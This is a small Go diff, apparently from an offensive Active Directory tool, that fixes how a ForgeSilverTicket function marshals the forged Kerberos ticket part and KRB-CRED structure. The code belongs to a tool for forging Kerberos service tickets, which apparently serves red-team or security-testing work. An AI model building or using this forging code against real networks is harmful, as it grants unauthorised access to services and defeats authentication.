@@ -129,7 +129,7 @@ func ForgeSilverTicket(req *SilverTicketRequest) (*SilverTicketResult, error) {
 	encTicketPart := buildSilverEncTicketPart(req, sessionKey, pacData, sname)
 
 	// Encrypt ticket part with SERVICE key
-	encTicketPartBytes, err := asn1.MarshalWithParams(encTicketPart, "application,tag:3")
+	encTicketPartBytes, err := asn1.MarshalWithParams(*encTicketPart, "application,tag:3")
 	if err != nil {
 		return nil, fmt.Errorf("failed to marshal enc-ticket-part: %w", err)
 	}
@@ -175,7 +175,7 @@ func ForgeSilverTicket(req *SilverTicketRequest) (*SilverTicketResult, error) {
 		},
 	}
 
-	credInfoBytes, _ := asn1.MarshalWithParams(credInfo, "application,tag:29")
+	credInfoBytes, _ := asn1.MarshalWithParams(*credInfo, "application,tag:29")
 
 	krbCred := &asn1krb5.KRBCred{
 		PVNO:    5,
